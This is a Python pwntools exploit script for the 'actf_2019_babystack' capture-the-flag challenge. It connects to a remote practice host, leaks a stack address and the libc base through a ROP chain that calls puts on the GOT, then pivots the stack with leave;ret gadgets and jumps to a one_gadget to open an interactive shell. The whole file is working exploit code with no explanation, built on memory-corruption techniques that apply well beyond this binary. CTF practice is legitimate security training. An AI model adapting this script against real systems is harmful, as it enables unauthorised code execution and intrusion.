# coding:utf-8
from os import system
from pwn import *
context.log_level = 'debug'

proc_name = 'actf_2019_babystack'
islocal = 0
libc = ELF('/home/klose/ctf/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29938)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def get_stack():
    global stack_addr
    p.recvuntil('>')
    p.sendline('224')
    p.recvuntil('0x')
    stack_addr = int(p.recv(12), 16)
    log.success('stack_addr => ' + hex(stack_addr))

def leak():
    global system_addr
    global str_bin_sh
    global one_gadget
    global fake_ebp
    global pop_rdi_ret
    global leave_ret

    fake_ebp = 'fake_ebp'
    pop_rdi_ret = 0x400ad3
    leave_ret = 0x400a18
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    main_addr = 0x400800
    payload1 = fake_ebp + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    payload1 = payload1.ljust(0xd0, 'a')
    payload1 += p64(stack_addr) + p64(leave_ret) 
    p.recvuntil('>')
    p.send(payload1)

    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = puts_addr - 0x809c0
    system_addr = libc_base + 0x4f440
    str_bin_sh = libc_base + 0x1b3e9a
    one_gadget = libc_base + 0x4f2c5
    log.success('puts_addr => ' + hex(puts_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('system_addr => ' + hex(system_addr))
    log.success('str_bin_sh => ' + hex(str_bin_sh))
    log.success('one_gadget => ' + hex(one_gadget))

def pwn():
    payload2 = fake_ebp + p64(one_gadget)
    payload2 = payload2.ljust(0xd0, 'a')
    payload2 += p64(stack_addr) + p64(leave_ret)
    p.recvuntil('>')
    p.send(payload2)

    p.interactive()

if __name__ == '__main__':
    get_stack()
    leak()
    sleep(4)
    get_stack()
    pwn()